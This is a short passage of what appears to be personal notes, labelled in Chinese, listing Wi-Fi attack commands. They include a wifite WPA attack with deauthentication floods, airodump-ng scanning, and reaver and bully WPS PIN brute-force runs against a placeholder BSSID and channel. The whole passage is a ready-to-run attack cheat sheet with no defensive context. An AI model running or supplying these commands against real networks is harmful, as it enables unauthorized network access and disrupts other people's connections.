...
### (WPA攻击) sudo wifite --no-wps --no-pmkid --wpa --num-deauths 5 -wpat 2000 -5
### sudo airodump-ng --band abg wlan0
### (ping码攻击) sudo reaver -i wlan0 -b <BSSID> -c <信道> -vv -K 1
### (ping码攻击) sudo bully wlan0 -b <BSSID> -c <信道> -v 3
